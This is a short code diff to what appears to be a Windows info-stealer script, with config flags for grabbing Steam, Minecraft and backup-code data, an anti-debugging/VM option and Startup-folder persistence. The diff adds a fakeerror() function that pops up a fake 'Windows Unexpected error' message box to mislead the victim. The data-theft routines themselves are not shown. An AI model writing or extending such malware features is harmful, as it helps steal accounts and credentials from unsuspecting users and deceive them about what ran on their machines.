@@ -32,7 +32,8 @@ __CONFIG__ = {
     "minecraft": False,
     "Steam": False,
     "Anti_Debugs_VM": False,
-    "backupcode": False
+    "backupcode": False,
+    "ERROR": False
 }
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -669,6 +670,9 @@ def startup():
     else:
         pass
 
+def fakeerror():
+    ctypes.windll.user32.MessageBoxW(0, "A critical error has occurred.", "Windows Unexpected error", 0x10)
+
 #def startup():
 #   startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
 #
@@ -704,5 +708,7 @@ def run_config():
     if __CONFIG__.get("Steam"):
         steam()
     # =========================== #
+    if __CONFIG__.get("ERROR"):
+        fakeerror()
 
 run_config()
